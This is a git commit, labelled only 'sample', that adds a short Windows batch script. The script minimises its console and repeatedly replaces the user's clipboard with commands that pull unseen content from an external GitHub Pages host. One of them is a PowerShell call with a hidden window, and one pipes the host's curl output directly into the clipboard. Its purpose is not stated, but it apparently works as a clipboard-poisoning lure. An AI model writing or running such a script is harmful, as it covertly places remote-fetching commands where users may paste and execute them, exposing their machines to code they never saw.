f1221d530c91e033672ceafdea37564f933468eb
4gu4 <105754310+4gu4@users.noreply.github.com>
2022-06-30 09:29:22 -0500

    sample
    sample

---
+++ i.bat
@@ -0,0 +1,15 @@
+@echo off
+mode con: cols=5 lines=2
+color 7F
+timeout /t 1 /nobreak >nul
+echo "powershell -windowstyle hidden scb(irm 4gu4.github.io/i)" | clip
+timeout /t 1 /nobreak >nul
+cls
+echo "let a; fetch('https://4gu4.github.io/i').then(b=>b.text()).then(c=>a=c);" | clip
+timeout /t 1 /nobreak >nul
+cls
+curl https://4gu4.github.io/i | clip
+timeout /t 2 /nobreak >nul
+cls
+timeout /t 1 /nobreak >nul
+echo "hola" > g.bat
